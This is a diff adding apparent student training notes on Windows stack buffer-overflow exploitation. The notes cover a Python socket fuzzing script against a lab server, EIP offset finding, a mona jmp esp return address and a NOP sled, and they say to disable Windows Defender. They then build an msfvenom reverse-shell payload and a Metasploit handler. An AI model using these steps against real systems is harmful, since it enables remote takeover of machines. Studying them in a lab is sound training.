@@ -388,7 +388,75 @@ print(buffer+eip+nop+buf)
 #0xf7f72c6b
 ```
 
+# Windows Exploitation Dev. 
+```
+- Run strings on .exe file 
+  - Ex: C:\Users\Student\Desktop.\SysinternalsSuite\strings.exe C:\Users\Student\Desktop\secureserverind.exe
+- When analyzing sting look for "strcopy" "gets" etc. (Vulnerable Stack indicators) 
+- get-content .\essfunc.dll | select -First 1
+  - command to see if .exe can run 
+- If possible to run on windows; run the program 
+- watch for possible port connection attemp 
+- nc on linux ops station 
+  - If not working ensure firewall is allowing port connection through 
+- Run commands that are allowed in nc connection 
+- Insert .exe file into decompiler 
+- strncmp -> comapres str1 and str2 by a specified number of bytes 
+- run immunity debugger
+  - attach .exe 
+  - play program 
+- create script 
+- import socket, 
+  EX: #!/usr/bin/env python 
+import socket
 
+buf = "TRUN/.:/"
+buf += ""
+
+s = socket.socket (socket.AF_INET, soccket.SOCK_STREAM)
+s.connect (("192.168.65.10",9999))
+print s.recv(1024)
+s.send(buf)
+print s.recv(1024)
+
+s.close()
+
+- Create buffer with wiremask.EU
+- check immunity debugger to make sure it ran 
+- Insert EIP into website to find exact offset 
+- replace buf variable with 2003, add "BBBB" 
+- run script again to verify eip is being replaced 
+- run !mona module in bottom console 
+- run !mona jmp -r esp -m "vulnerable.dll" in bottom console 
+- copy first 4 mem. addresses into script(cooment out with 3 single quotes)
+  - if copying ensure letters are lowercase, add "0x"
+- Turn into little endian 
+- Replace BBBB with first converted mem address -> buf += "\xa0\x12\x50\x62"
+- insert nop sled buf += "\x90" * 15
+- Rewind debugger and play it again 
+- Turn off real time threat protection on windows defender
+
+- msfvenom -p windows/shell/reverse_tcp lhost= 192.168.65.20 lport=1738 -b "\x00" -f python
+  - Venom command with local ip and random high port
+- msf console 
+  - use multi/handler 
+  - show options 
+  -  set payload windows/meterpreter/reverse_tcp
+  - set lhost 0.0.0.0 (listen on all)
+  - set lport to listening port set
+  - exploit 
+
+
+
+
+
+
+
+
+
+
+
+```
 
 
 
